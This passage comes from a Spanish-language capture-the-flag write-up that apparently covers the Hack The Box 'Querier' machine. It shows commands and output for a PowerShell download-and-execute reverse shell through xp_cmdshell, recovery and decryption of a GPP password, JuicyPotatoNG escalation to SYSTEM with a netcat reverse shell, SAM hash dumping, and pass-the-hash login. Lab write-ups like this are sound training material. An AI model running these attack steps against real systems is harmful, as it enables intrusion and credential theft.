+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\mssql-svc  dbo@master)&gt; xp_cmdshell &quot;whoami&quot;
+output
+-----------------
+querier\mssql-svc
+
+NULL
+
+SQL (QUERIER\mssql-svc  dbo@master)&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Ahora podemos ganar acceso ala maquina empleando lo siguiente <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</p>
+</li>
+<li><p>Vamos a modificar el script para entablarnos una <code>reverse shell</code> directamente.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443' &gt;&gt; Invoke-PowerShellTcp.ps1
+➜  content cat Invoke-PowerShellTcp.ps1 | tail -n 1
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443
+</code></pre></div></div>
+<ul>
+<li>Vamos a ejecutar un servicio <code>http</code> con <code>python3</code> por el puerto <code>80</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre></div></div>
+<ul>
+<li>Y ahora nos podemos en escucha por el puerto 443 para que nos llegue la <code>reverse shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content rlwrap nc -nvlp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Ahora usamos el <code>xp_cmdshell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\mssql-svc  dbo@master)&gt; xp_cmdshell &quot;powershell IEX(New-Object Net.WebClient).downloadString(\&quot;http://10.10.15.11/Invoke-PowerShellTcp.ps1\&quot;)&quot;
+</code></pre></div></div>
+<ul>
+<li>Nos llega la <code>reverse shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content rlwrap nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.15.11] from (UNKNOWN) [10.129.67.247] 49677
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt;whoami
+querier\mssql-svc
+PS C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Windows\system32&gt; type C:\Users\mssql-svc\Desktop\user.txt
+e96e197911a391c99a71cd3596542670
+PS C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<ul>
+<li>Tenemos el <code>SeImpersonatePrivilege</code> <code>Enable</code> y podemos usar el <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a> para explotarlo pero no es la principal vía para escalar privilegios de la maquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div></div>
+<ul>
+<li>Lo que podemos hacer para enumerar la maquina es usar <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; curl -o PowerUp.ps1 10.10.15.11/PowerUp.ps1
+PS C:\Users\mssql-svc\Desktop&gt; dir
+
+
+    Directory: C:\Users\mssql-svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                   
+----                -------------         ------ ----                   
+-a----         4/5/2024   9:26 PM         600580 PowerUp.ps1            
+-ar---         4/5/2024   7:41 PM             34 user.txt      
+</code></pre></div></div>
+<ul>
+<li>Ahora importamos el modulo y lo ejecutamos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; Import-Module .\PowerUp.ps1
+PS C:\Users\mssql-svc\Desktop&gt; Invoke-AllChecks
+</code></pre></div></div>
+<ul>
+<li>Después de ejecutarse nos da una contraseña para el usuario Administrador.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; Invoke-AllChecks
+
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 780
+ProcessId   : 4268
+Name        : 4268
+Check       : Process Token Privileges
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+IdentityReference : QUERIER\mssql-svc
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+Check     : Cached GPP Files
+</code></pre></div></div>
+<ul>
+<li>La encontró aquí.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; type &quot;C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml&quot;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
+&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator&quot; image=&quot;2&quot; changed=&quot;2019-01-28 23:12:48&quot; uid=&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot; userContext=&quot;0&quot; removePolicy=&quot;0&quot; policyApplied=&quot;1&quot;&gt;
+&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;Administrator&quot;&gt;&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;
+PS C:\Users\mssql-svc\Desktop&gt;
+</code></pre></div></div>
+<ul>
+<li>Pero si vemos la contraseña esta encriptada y se puede desencriptar con <code>gpp-decrypt</code> aunque la herramienta ya no la dio en texto plano.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
+MyUnclesAreMarioAndLuigi!!1!
+</code></pre></div></div>
+<ul>
+<li>Vamos a validar la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
+</code></pre></div></div>
+<ul>
+<li>Gracias al output que nos dan <strong>Pwn3d!</strong> ya nos podemos conectar al servicio <code>winrm</code> empleando <code>evil-winrm</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+querier\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</code></pre></div></div>
+<h2 id="root-flag">root flag</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
+38f63aa04664d186bccca4c48252e656
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</code></pre></div></div>
+<h2 id="explotando-el-setimpersonateprivilege">Explotando el SetImpersonatePrivilege</h2>
+<ul>
+<li><p>Bueno explotar esto es muy fácil ya lo hemos echo muchas veces.</p>
+</li>
+<li><p>Primero necesitamos traer ala maquina el <code>netcat</code> para Windows para ganar una <code>reverse shell</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; curl -o nc.exe 10.10.15.11/nc.exe
+PS C:\Users\mssql-svc\Desktop&gt; dir
+
+
+    Directory: C:\Users\mssql-svc\Desktop
+
+
+Mode                LastWriteTime         Length Name                   
+----                -------------         ------ ----                   
+-a----         4/5/2024   9:39 PM          28160 nc.exe                 
+-a----         4/5/2024   9:26 PM         600580 PowerUp.ps1            
+-ar---         4/5/2024   7:41 PM             34 user.txt               
+
+
+PS C:\Users\mssql-svc\Desktop&gt; curl -o JuicyPotatoNG.exe 10.10.15.11/JuicyPotatoNG.exe
+PS C:\Users\mssql-svc\Desktop&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Ahora nos ponemos en escucha con <code>rlwrap</code> con lo habíamos hecho antes.</p>
+</li>
+<li><p>Nos enviamos la <code>reverse shell</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\mssql-svc\Desktop&gt; .\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Users\mssql-svc\Desktop\nc.exe 10.10.15.11 443 -e powershell&quot;
+</code></pre></div></div>
+<ul>
+<li>Y ahora recibimos la <code>reverse shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.15.11] from (UNKNOWN) [10.129.67.247] 49686
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\&gt; whoami
+whoami
+nt authority\system
+PS C:\&gt;
+</code></pre></div></div>
+<h2 id="dumpeando-los-hashes-ntlm-almacenados-en-la-sam">Dumpeando los hashes NTLM almacenados en la SAM</h2>
+<ul>
+<li>Y bueno algo extra es que como tenemos las credenciales del usuario administrador podemos <code>dumpear</code> los hashes de los demás usuario para hacer <code>pass the hash</code> y conectarnos sin proporcionar contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth --sam
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
+SMB         10.129.67.247   445    QUERIER          [+] Dumping SAM hashes
+SMB         10.129.67.247   445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
+SMB         10.129.67.247   445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.67.247   445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.67.247   445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
+SMB         10.129.67.247   445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
+SMB         10.129.67.247   445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
+SMB         10.129.67.247   445    QUERIER          [+] Added 6 SAM hashes to the database
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.129.67.247 -u Administrator -H 2dcefe78334b42c0ce483b8e1b2886ab
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+querier\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
